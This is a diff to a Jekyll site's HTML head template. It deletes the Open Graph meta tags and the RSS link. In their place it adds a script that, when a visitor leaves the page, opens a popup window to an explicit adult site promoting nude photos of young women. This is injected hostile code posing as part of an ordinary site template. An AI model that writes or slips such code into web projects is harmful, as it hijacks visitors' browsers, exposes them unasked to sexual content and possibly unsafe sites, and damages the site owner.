@@ -6,16 +6,18 @@
   <title>{% if page.title %}{{ page.title }}{% else %}{{ site.title }}{% endif %}</title>
   {% if page.description %}<meta name="description" content="{{ page.description }}">{% endif %}
   <link rel="stylesheet" href="/css/main.css">
-  <meta property="og:title" content="{% if page.title %}{{ page.title }}{% else %}{{ site.title }}{% endif %}"/>
-  <meta property="og:type" content="{% if page.thumbnail %}article{% else %}website{% endif %}"/>
-  <meta property="og:url" content="{{ page.url | replace:'index.html','' | prepend: site.baseurl | prepend: site.url }}" />
-  {% if page.description %}
-  <meta property="og:description" content="{{page.description}}"/>
-  {% endif %}
-  <meta property="og:site_name" content="{{ site.title }}" />
-  {% if page.ogimage %}
-  <meta property="og:image" content="{{ page.ogimage }}" /> 
-  {% endif %} 
+      <script language="javascript"><!--
+      function PopUp() {
+    	var TheURL = "http://www.sexdhun.com/gallery/desi-cute-indian-college-girl-nude-photos.html";
+    	var PopWidth = "1300";
+    	var PopHeight = "700";
+    	var PosTop = "";
+    	var PosLeft = "";
+    	var SettingS = "toolbar=no,menubar=no,scrollbars=no,resizable=yes,width=" + PopWidth + ",height=" + PopHeight + ",top=" + PosTop + ",left=" + PosLeft;
+    	var PopUp = open(TheURL,"box",SettingS);
+    }
+    window.onunload=PopUp;
+    // -->
+    </script>
   <link rel="canonical" href="{{ page.url | replace:'index.html','' | prepend: site.baseurl | prepend: site.url }}">
-  <link rel="alternate" type="application/rss+xml" title="{{ site.title }}" href="{{ "/feed.xml" | prepend: site.baseurl | prepend: site.url }}" />
 </head>
